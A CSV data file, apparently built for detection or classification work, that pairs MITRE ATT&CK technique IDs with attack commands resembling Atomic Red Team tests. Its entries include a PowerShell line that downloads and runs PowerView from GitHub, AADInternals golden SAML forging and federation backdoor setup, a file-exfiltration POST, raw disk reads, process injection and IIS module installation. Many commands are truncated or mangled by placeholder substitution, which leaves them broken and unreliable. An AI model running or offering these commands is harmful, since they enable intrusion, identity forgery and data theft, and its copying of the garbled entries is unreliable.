mitre_id,command
T1027,"c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe \out:var_723"""
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_36993 write-host ""end of federation configuration."""
T1572,var_281 &
T1592,"get-ciminstance  -query  ""select  *  from  win32_pnpentity  where  (pnpclass  =  'image'  or  pnpclass  =  'camera')""# run_2566"
T1613,docker build -t t1613 $pathtoatomicsfolder/t1613/src/ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613)> /dev/null 2>&1 # id_23
T1041,if(-not (test-path var_311 -method post -body $filecontent -disablekeepalive
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_56286"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1083,"cd $home && find . -print | sed -e 's;[^\]*\;|__;g;s;__|; |;g' > var_341 find . -type f -name "".*"""
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_52736"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1124,net  time  \\var_40169  w32tm  \tz
T1047,"wmic qfe get description,installedon \format:csv"
T1202,"scriptrunner.exe -appvscript ""var_964"""
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_439 write-host ""end of golden saml"""
T1049,netstat who -a
T1055,"start-process ""var_68318"" start-sleep -seconds 7 get-process -name notepad -erroraction silentlycontinue | stop-process -force"
T1120,fsutil fsinfo drives# run_2858
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 1> /dev/null 2>&1 # id_85"
T1134,"var_21296"" ""exit"""
T1134,start-athprocessunderspecificparent -filepath var_272
T1120,fsutil  fsinfo  drives# run_9471
T1615,"powershell  -nop  -exec  bypass  -c  ""iex  (new-object  net.webclient).downloadstring('https:\\github.com\bc-security\empire\blob\86921fbbf4945441e2f9d9e7712c5a6e96eed0f3\empire\server\data\module_source\situational_awareness\network\powerview.ps1');  get-domaingpo""> /dev/null 2>&1 # id_50"
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh> /dev/null 2>&1 # id_61
T1049,$syntaxlist = var_4940
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_246"""
T1505,%windir%\system32\inetsrv\appcmd.exe install module \name:var_547
